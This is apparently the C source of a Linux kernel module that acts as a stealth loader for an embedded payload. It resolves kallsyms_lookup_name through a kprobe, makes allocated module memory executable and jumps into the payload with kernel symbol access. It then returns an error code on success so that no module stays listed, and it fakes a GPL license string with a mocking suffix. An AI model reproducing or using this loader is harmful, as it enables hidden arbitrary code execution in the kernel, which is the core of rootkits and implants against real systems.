#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <net/net_namespace.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
#else
extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);
#endif

#include "payload.inc"

static long lookupName = 0;
module_param(lookupName, long, 0);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t get_kallsyms_lookup_name(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    int ret;
    kallsyms_lookup_name_t func;
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    ret = register_kprobe(&kp);
    if (ret)
        return ERR_PTR(ret);

    func = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    return func;
#else
    return &kallsyms_lookup_name;
#endif
}

unsigned long lookup_name(const char *name) {
    kallsyms_lookup_name_t kallsyms_lookup_name_func = get_kallsyms_lookup_name();
    if (IS_ERR(kallsyms_lookup_name_func)) {
        pr_warn("Symbol not found: 'kallsyms_lookup_name'");
        return -EINVAL;
    }
    return (void *)kallsyms_lookup_name_func(name);
}

int init_module(void) {
    void *mem = NULL;
    void *(*malloc)(long size) = NULL;
    int   (*set_memory_x)(unsigned long, int) = NULL;

    malloc = (void *)lookup_name("module_alloc");
    if (!malloc) {
        pr_debug("module_alloc() not found\n");
        goto Error;
    }

    mem = malloc(round_up(payload_len, PAGE_SIZE));
    if (!mem) {
        pr_debug("malloc(payload_len) failed\n");
        goto Error;
    }

    set_memory_x = (void *)lookup_name("set_memory_x");
    if (set_memory_x) {
        int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
        set_memory_x((unsigned long)mem, numpages);
    } else {
        pr_debug("set_memory_x(payload_len) failed\n");
        goto Error;
    }

    print_hex_dump_bytes("payload@", DUMP_PREFIX_OFFSET, payload, payload_len);

    memcpy(mem, payload, payload_len);
    if (0 == ((long (*)(void *, void *))mem)(lookup_name, &init_net))
        return -ENOTTY; // success

Error:
    if (mem) vfree(mem);
    return -EINVAL; // failure
}

MODULE_LICENSE("GPL\0But who really cares?");
